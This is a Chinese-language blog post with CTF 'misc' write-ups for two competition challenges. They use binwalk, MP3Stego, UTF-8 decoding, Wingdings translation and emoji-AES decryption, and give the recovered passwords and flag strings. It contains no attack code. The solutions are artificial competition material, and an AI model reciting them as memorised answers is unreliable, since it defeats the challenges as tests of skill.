        <h1 id="MP3文件的分离及表情包和winding的解密"><a href="#MP3文件的分离及表情包和winding的解密" class="headerlink" title="MP3文件的分离及表情包和winding的解密"></a>MP3文件的分离及表情包和winding的解密</h1><h2 id="蓝帽杯（冬奥）"><a href="#蓝帽杯（冬奥）" class="headerlink" title="蓝帽杯（冬奥）"></a>蓝帽杯（冬奥）</h2><p>下载文件，发现是一张图片，此时用kali的binwalk进行分离，</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk 文件名称</span><br></pre></td></tr></table></figure>
<p>发现有rar文件、MP3文件及zip文件，之后发现zip文件无用，然后用kali的MP3Stego对mp3文件进行解密，密码猜测为冬奥会举办时间</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">解密：</span><br><span class="line">decode.exe -P 密码 文件及路径</span><br><span class="line"></span><br><span class="line">加密：</span><br><span class="line">encode.exe -P 密码 文件及路径</span><br></pre></td></tr></table></figure>
<p>然后发现有一串\x的数字，按特征，是utf-8编码，因此可以使用脚本</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">#coding=utf-8</span><br><span class="line">print(b&quot;\xe2\x9c\x8c\xef\xb8\x8e \xe2\x98\x9d\xef\xb8\x8e\xe2\x99\x93\xef\xb8\x8e\xe2\xa7\xab\xef\xb8\x8e\xe2\x98\x9f\xef\xb8\x8e\xe2\x97\x86\xef\xb8\x8e\xe2\x99\x8c\xef\xb8\x8e \xe2\x9d\x92\xef\xb8\x8e\xe2\x99\x8f\xef\xb8\x8e\xe2\x97\xbb\xef\xb8\x8e\xe2\x96\xa1\xef\xb8\x8e\xe2\xac\xa7\xef\xb8\x8e\xe2\x99\x93\xef\xb8\x8e\xe2\xa7\xab\xef\xb8\x8e\xe2\x96\xa1\xef\xb8\x8e\xe2\x9d\x92\xef\xb8\x8e\xe2\x8d\x93\xef\xb8\x8e \xe2\x96\xa0\xef\xb8\x8e\xe2\x99\x8b\xef\xb8\x8e\xe2\x9d\x8d\xef\xb8\x8e\xe2\x99\x8f\xef\xb8\x8e\xe2\x99\x8e\xef\xb8\x8e \xf0\x9f\x93\x82\xef\xb8\x8e\xe2\x99\x8d\xef\xb8\x8e\xe2\x99\x8f\xef\xb8\x8e\xf0\x9f\x8f\xb1\xef\xb8\x8e\xe2\x99\x8f\xef\xb8\x8e\xe2\x99\x8b\xef\xb8\x8e\xf0\x9f\x99\xb5 \xe2\x99\x93\xef\xb8\x8e\xe2\xac\xa7\xef\xb8\x8e \xe2\x9d\x96\xef\xb8\x8e\xe2\x99\x8f\xef\xb8\x8e\xe2\x9d\x92\xef\xb8\x8e\xe2\x8d\x93\xef\xb8\x8e \xe2\x99\x93\xef\xb8\x8e\xe2\x96\xa0\xef\xb8\x8e\xe2\xa7\xab\xef\xb8\x8e\xe2\x99\x8f\xef\xb8\x8e\xe2\x9d\x92\xef\xb8\x8e\xe2\x99\x8f\xef\xb8\x8e\xe2\xac\xa7\xef\xb8\x8e\xe2\xa7\xab\xef\xb8\x8e\xe2\x99\x93\xef\xb8\x8e\xe2\x96\xa0\xef\xb8\x8e\xe2\x99\x91\xef\xb8\x8e\xf0\x9f\x93\xac\xef\xb8\x8e \xf0\x9f\x95\x88\xef\xb8\x8e\xe2\x99\x92\xef\xb8\x8e\xe2\x8d\x93\xef\xb8\x8e \xe2\x96\xa0\xef\xb8\x8e\xe2\x96\xa1\xef\xb8\x8e\xe2\xa7\xab\xef\xb8\x8e \xe2\xa7\xab\xef\xb8\x8e\xe2\x99\x8b\xef\xb8\x8e\xf0\x9f\x99\xb5\xe2\x99\x8f\xef\xb8\x8e \xe2\x99\x8b\xef\xb8\x8e \xe2\x97\x8f\xef\xb8\x8e\xe2\x96\xa1\xef\xb8\x8e\xe2\x96\xa1\xef\xb8\x8e\xf0\x9f\x99\xb5 \xe2\x99\x8b\xef\xb8\x8e\xe2\xa7\xab\xef\xb8\x8e \xe2\x99\x93\xef\xb8\x8e\xe2\xa7\xab\xef\xb8\x8e\xe2\x9c\x8d\xef\xb8\x8e&quot;.decode(&#x27;utf-8&#x27;))</span><br></pre></td></tr></table></figure>
<p>可以得到一串符号(注意要在pycharm中运行，命令行会有乱码）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">✌︎ ☝︎♓︎⧫︎☟︎◆︎♌︎ ❒︎♏︎◻︎□︎⬧︎♓︎⧫︎□︎❒︎⍓︎ ■︎♋︎❍︎♏︎♎︎ 📂︎♍︎♏︎🏱︎♏︎♋︎🙵 ♓︎⬧︎ ❖︎♏︎❒︎⍓︎ ♓︎■︎⧫︎♏︎❒︎♏︎⬧︎⧫︎♓︎■︎♑︎📬︎ 🕈︎♒︎⍓︎ ■︎□︎⧫︎ ⧫︎♋︎🙵♏︎ ♋︎ ●︎□︎□︎🙵 ♋︎⧫︎ ♓︎⧫︎✍︎</span><br></pre></td></tr></table></figure>
<p>看特征是winding编码，因此可以使用<a target="_blank" rel="noopener" href="https://lingojam.com/WingdingsTranslator%E8%BF%9B%E8%A1%8C%E5%9C%A8%E7%BA%BF%E8%A7%A3%E7%A0%81%EF%BC%8C%E5%BE%97%E5%88%B0">https://lingojam.com/WingdingsTranslator进行在线解码，得到</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">A︎ G︎i︎t︎H︎u︎b︎ r︎e︎p︎o︎s︎i︎t︎o︎r︎y︎ n︎a︎m︎e︎d︎ 1︎c︎e︎P︎e︎a︎k i︎s︎ v︎e︎r︎y︎ i︎n︎t︎e︎r︎e︎s︎t︎i︎n︎g︎.︎ W︎h︎y︎ n︎o︎t︎ t︎a︎ke︎ a︎ l︎o︎o︎k </span><br></pre></td></tr></table></figure>
<p>可以知道只要在github搜索1cePeak即可得到</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line">echo How_6ad_c0uld_a_1cePeak_be? &gt;&amp;2</span><br></pre></td></tr></table></figure>
<p>之后将rar放进winhex中，发现chiper，因此可以进行hex解码，得到</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">🙃💵🌿🎤🚪🌏🐎🥋🚫😆🎃✅⌨🔪❓🚫🐍🙃🔬✉👁😆🎈🐘🏎🐘🐘😂😎🎅🖐🐍✉🍌🌪🐎🍵✅🚪✖☃👣👉ℹ🔪🍎🔄👣🚪😁👣💵🐅🍵🔬🛩😇🖐🖐🎅✅🏎👌🚨😆🎤🎅🦓🌿🦓🙃✖🍌🛩😂👑🌏☃😇😍🛩🚹😀🍌🎈💧🗒🗒</span><br></pre></td></tr></table></figure>
<p>这是表情包+aes加密，因此可以使用<a target="_blank" rel="noopener" href="https://aghorler.github.io/emoji-aes/%E8%BF%9B%E8%A1%8C%E8%A7%A3%E5%AF%86%EF%BC%8C%E5%AF%86%E7%A0%81%E4%B8%BA%E5%89%8D%E9%9D%A2mp3%E6%96%87%E4%BB%B6%E4%B8%AD%E6%89%BE%E5%88%B0%E7%9A%84How_6ad_c0uld_a_1cePeak_be">https://aghorler.github.io/emoji-aes/进行解密，密码为前面mp3文件中找到的How_6ad_c0uld_a_1cePeak_be</a>?</p>
<h2 id="巅峰极客（签到）"><a href="#巅峰极客（签到）" class="headerlink" title="巅峰极客（签到）"></a>巅峰极客（签到）</h2><p>打开文件，发现表情包</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">🙃💵🌿🎤🚪🌏🐎🥋🚫😆😍🥋🐘🍴🚰😍☀🌿😇😍😡🏎👉🛩🤣🖐💧☺🌉🏎😇😆🎈💧⏩☺🔄🌪⌨🐅🎅🙃🍌🙃🔪☂🏹🕹☃🌿🌉💵🐎🐍😇🍵😍🐅🎈🥋🚰✅🎈🎈</span><br></pre></td></tr></table></figure>
<p>且题目说给GAME，因此使用<a target="_blank" rel="noopener" href="https://aghorler.github.io/emoji-aes/%E8%A7%A3%E5%AF%86%EF%BC%8C%E5%AF%86%E7%A0%81%E4%B8%BAGAME">https://aghorler.github.io/emoji-aes/解密，密码为GAME</a>
 </p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/misc/" rel="tag">misc</a></li></ul>
	</div>

      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
  
    <nav id="page-nav">
      <a class="extend prev" rel="prev" href="/page/2/">&amp;laquo; Prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><span class="space">&hellip;</span><a class="page-number" href="/page/8/">8</a><a class="extend next" rel="next" href="/page/4/">Next &amp;raquo;</a>
    </nav>
  
</div>
      <footer id="footer">
  <div class="outer">
    <div id="footer-info">
      <div class="footer-left">
        &copy; 2021 John Doe
      </div>
        <div class="footer-right">
          <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/smackgg/hexo-theme-smackdown" target="_blank">Smackdown</a>
        </div>
    </div>
  </div>
</footer>
    </div>
    
  
<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">



<script>
	var yiliaConfig = {
		fancybox: true,
		mathjax: true,
		animate: true,
		isHome: true,
		isPost: false,
		isArchive: false,
		isTag: false,
		isCategory: false,
		open_in_new: false
	}
</script>

<script src="/js/main.js"></script>




<script type="text/x-mathjax-config">
MathJax.Hub.Config({
    tex2jax: {
        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
        processEscapes: true,
        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
    }
});

MathJax.Hub.Queue(function() {
    var all = MathJax.Hub.getAllJax(), i;
    for(i=0; i < all.length; i += 1) {
        all[i].SourceElement().parentNode.className += ' has-jax';                 
    }       
});
</script>

<script src="//cdn.bootcss.com/mathjax/2.7.0/MathJax.js"></script>


  </div>
</body>
</html>